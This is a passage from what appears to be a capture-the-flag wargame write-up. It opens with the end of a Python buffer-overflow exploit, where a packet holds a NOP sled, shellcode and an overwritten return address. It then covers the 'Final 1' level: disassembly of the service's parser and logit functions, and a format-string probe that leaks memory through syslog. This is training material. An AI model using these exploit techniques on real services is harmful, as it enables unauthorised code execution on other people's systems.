<span class="lineno">11 </span>
<span class="lineno">12 </span><span class="n">offset</span> <span class="o">=</span> <span class="mi">532</span>
<span class="lineno">13 </span><span class="n">packet</span> <span class="o">=</span> <span class="s">&quot;aaa</span><span class="se">\x0d</span><span class="s">&quot;</span>
<span class="lineno">14 </span><span class="n">packet</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">shellcode</span>
<span class="lineno">15 </span><span class="n">packet</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xCC</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">packet</span><span class="p">))</span>
<span class="lineno">16 </span><span class="n">packet</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x74\xf4\xff\xbf</span><span class="s">&quot;</span>
<span class="lineno">17 </span><span class="n">packet</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x0a</span><span class="s">&quot;</span>
<span class="lineno">18 </span>
<span class="lineno">19 </span><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
<span class="lineno">20 </span>
<span class="lineno">21 </span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="lineno">22 </span><span class="k">print</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">data</span>
<span class="lineno">23 </span>
<span class="lineno">24 </span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div>


<h1 id="final-1">Final 1</h1>

<p>For this level we have got a binary listening on port 2994.</p>

<h2 id="exploitation-2">Exploitation</h2>

<p>Let&rsquo;s find out what this binary is up to.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x08049ab9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x08049aba</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x08049abc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="n">and</span>    <span class="err">$</span><span class="mh">0xfffffff0</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x08049abf</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="err">$</span><span class="mh">0x20</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x08049ac2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049aca</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049ad2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x8049f5f</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049ad9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048f98</span> <span class="o">&lt;</span><span class="n">background_process</span><span class="o">&gt;</span>
<span class="mh">0x08049ade</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0xbb2</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049ae5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8049435</span> <span class="o">&lt;</span><span class="n">serve_forever</span><span class="o">&gt;</span>
<span class="mh">0x08049aea</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049aee</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08049af2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049af5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8049515</span> <span class="o">&lt;</span><span class="n">set_io</span><span class="o">&gt;</span>
<span class="mh">0x08049afa</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8049a31</span> <span class="o">&lt;</span><span class="n">getipport</span><span class="o">&gt;</span>
<span class="mh">0x08049aff</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">70</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x804993d</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">&gt;</span>
<span class="p">...</span>
</code></pre></div>


<p>Once again, we have got a service waiting for our commands.
The magic is happening in parser().</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="p">..</span>
<span class="mh">0x08049940</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>  	<span class="n">sub</span>    <span class="err">$</span><span class="mh">0x98</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x08049946</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>  	<span class="n">mov</span>    <span class="err">$</span><span class="mh">0x8049f0e</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span> <span class="s">&quot;[final1] $ &quot;</span>
<span class="mh">0x0804994b</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;:</span> 	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804994e</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;:</span> 	<span class="n">call</span>   <span class="mh">0x8048ccc</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08049953</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;:</span> 	<span class="n">jmp</span>    <span class="mh">0x8049a08</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">203</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">start</span> <span class="n">loop</span>
<span class="mh">0x08049958</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">27</span><span class="o">&gt;:</span> 	<span class="n">lea</span>    <span class="o">-</span><span class="mh">0x88</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">input</span> <span class="n">buffer</span>
<span class="mh">0x0804995e</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">33</span><span class="o">&gt;:</span> 	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049961</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;:</span> 	<span class="n">call</span>   <span class="mh">0x80498f1</span> <span class="o">&lt;</span><span class="n">trim</span><span class="o">&gt;</span>
<span class="mh">0x08049966</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">41</span><span class="o">&gt;:</span> 	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x9</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>          <span class="p">;</span> <span class="mi">9</span> <span class="n">chars</span>
<span class="mh">0x0804996e</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span> 	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x8049f1a</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>    <span class="p">;</span> <span class="s">&quot;username &quot;</span>
<span class="mh">0x08049976</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;:</span> 	<span class="n">lea</span>    <span class="o">-</span><span class="mh">0x88</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">input</span> <span class="n">buffer</span>
<span class="mh">0x0804997c</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;:</span> 	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804997f</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">66</span><span class="o">&gt;:</span> 	<span class="n">call</span>   <span class="mh">0x8048d9c</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08049984</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">71</span><span class="o">&gt;:</span> 	<span class="n">test</span>   <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08049986</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;:</span> 	<span class="n">jne</span>    <span class="mh">0x80499a3</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">102</span><span class="o">&gt;</span>
<span class="mh">0x08049988</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">75</span><span class="o">&gt;:</span> 	<span class="n">lea</span>    <span class="o">-</span><span class="mh">0x88</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">input</span> <span class="n">buffer</span>
<span class="hll"><span class="mh">0x0804998e</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">81</span><span class="o">&gt;:</span> 	<span class="n">add</span>    <span class="err">$</span><span class="mh">0x9</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>               <span class="p">;</span> <span class="n">string</span> <span class="n">after</span> <span class="s">&quot;username &quot;</span>
</span><span class="mh">0x08049991</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;:</span> 	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049995</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">88</span><span class="o">&gt;:</span> 	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x804a220</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>       <span class="p">;</span> <span class="n">target</span> <span class="n">address</span>
<span class="mh">0x0804999c</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">95</span><span class="o">&gt;:</span> 	<span class="n">call</span>   <span class="mh">0x8048cbc</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080499a1</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;:</span>	<span class="n">jmp</span>    <span class="mh">0x80499fb</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">190</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="k">continue</span>
<span class="mh">0x080499a3</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">102</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x6</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>          <span class="p">;</span> <span class="mi">6</span> <span class="n">chars</span>
<span class="mh">0x080499ab</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">110</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x8049f24</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>    <span class="p">;</span> <span class="s">&quot;login &quot;</span>
<span class="mh">0x080499b3</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">118</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="o">-</span><span class="mh">0x88</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">input</span> <span class="n">buffer</span>
<span class="mh">0x080499b9</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">124</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080499bc</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">127</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048d9c</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080499c1</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">132</span><span class="o">&gt;:</span>	<span class="n">test</span>   <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080499c3</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">134</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x80499fb</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">190</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="k">continue</span>
<span class="mh">0x080499c5</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">136</span><span class="o">&gt;:</span>	<span class="n">movzbl</span> <span class="mh">0x804a220</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>          <span class="p">;</span> <span class="n">username</span> <span class="n">buffer</span>
<span class="mh">0x080499cc</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">143</span><span class="o">&gt;:</span>	<span class="n">test</span>   <span class="o">%</span><span class="n">al</span><span class="p">,</span><span class="o">%</span><span class="n">al</span>
<span class="hll"><span class="mh">0x080499ce</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">145</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x80499de</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">161</span><span class="o">&gt;</span>
</span><span class="mh">0x080499d0</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">147</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x8049f2b</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>       <span class="p">;</span> <span class="s">&quot;invalid protocol&quot;</span>
<span class="mh">0x080499d7</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">154</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048d4c</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080499dc</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">159</span><span class="o">&gt;:</span>	<span class="n">jmp</span>    <span class="mh">0x80499fb</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">190</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="k">continue</span>
<span class="mh">0x080499de</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">161</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="o">-</span><span class="mh">0x88</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">input</span> <span class="n">buffer</span>
<span class="mh">0x080499e4</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">167</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="err">$</span><span class="mh">0x6</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>               <span class="p">;</span> <span class="n">string</span> <span class="n">after</span> <span class="s">&quot;login &quot;</span>
<span class="mh">0x080499e7</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">170</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080499ea</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">173</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x804989a</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">&gt;</span>
<span class="mh">0x080499ef</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">178</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x8049f3c</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>       <span class="p">;</span> <span class="s">&quot;login failed&quot;</span>
<span class="mh">0x080499f6</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">185</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048d4c</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080499fb</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">190</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="err">$</span><span class="mh">0x8049f0e</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span> <span class="s">&quot;[final1] $ &quot;</span>
<span class="mh">0x08049a00</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">195</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049a03</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">198</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048ccc</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08049a08</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">203</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="mh">0x804a1e8</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>          <span class="p">;</span> <span class="n">stdin</span><span class="err">@@</span><span class="n">GLIBC_2</span><span class="mf">.0</span>
<span class="mh">0x08049a0d</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">208</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>          <span class="p">;</span>
<span class="mh">0x08049a11</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">212</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>         <span class="p">;</span> <span class="mi">127</span>
<span class="mh">0x08049a19</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">220</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="o">-</span><span class="mh">0x88</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">input</span> <span class="n">buffer</span>
<span class="mh">0x08049a1f</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">226</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049a22</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">229</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048bdc</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08049a27</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">234</span><span class="o">&gt;:</span>	<span class="n">test</span>   <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08049a29</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">236</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x8049958</span> <span class="o">&lt;</span><span class="n">parser</span><span class="o">+</span><span class="mi">27</span><span class="o">&gt;</span>
<span class="p">..</span>
</code></pre></div>


<p>The heap variable for the username is 0x7F.
This means that 9 bytes are empty, because &ldquo;username &rdquo; is stripped in parser+81.
After storing the username, we can take the jne in parser+145 with &ldquo;login &ldquo;.
The next step is the logit() function.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="p">...</span>
<span class="mh">0x0804989d</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span> 	<span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x228</span>
<span class="mh">0x080498a3</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>	  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x8049ee4</span>                   <span class="p">;</span> <span class="n">format</span> <span class="n">string</span>
<span class="mh">0x080498a8</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
<span class="mh">0x080498ab</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">edx</span>        <span class="p">;</span> <span class="n">login</span>
<span class="mh">0x080498af</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">],</span><span class="mh">0x804a220</span>  <span class="p">;</span> <span class="n">username</span>
<span class="mh">0x080498b7</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x804a2a0</span>   <span class="p">;</span> <span class="s">&quot;host:ip&quot;</span>
<span class="mh">0x080498bf</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">eax</span>         <span class="p">;</span> <span class="n">format</span> <span class="n">string</span>
<span class="mh">0x080498c3</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">41</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x200</span>       <span class="p">;</span> <span class="mi">512</span> <span class="n">bytes</span>
<span class="mh">0x080498cb</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x208</span><span class="p">]</span>                 <span class="p">;</span> <span class="n">target</span> <span class="n">buffer</span>
<span class="mh">0x080498d1</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">55</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
<span class="mh">0x080498d4</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">58</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048dac</span> <span class="o">&lt;</span><span class="n">snprintf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080498d9</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x208</span><span class="p">]</span>
<span class="mh">0x080498df</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">69</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
<span class="mh">0x080498e3</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0xf</span>
<span class="mh">0x080498ea</span> <span class="o">&lt;</span><span class="n">logit</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048b6c</span> <span class="o">&lt;</span><span class="n">syslog</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="p">...</span>
</code></pre></div>
</p>

<p>The snprintf function looks secure.
Other functions like trim() are also not vulnerable.
The only hint we have got would be a format string injection that is passed to syslog() via snprintf().
Lets test that idea.
To do this we provide a format string expression as a username.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">[final1] $ username AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x</span>
<span class="go">[final1] $ login test</span>
<span class="go">login failed</span>
</code></pre></div>


<p>This produces a syslog entry with memory information that looks like DWORDs.</p>

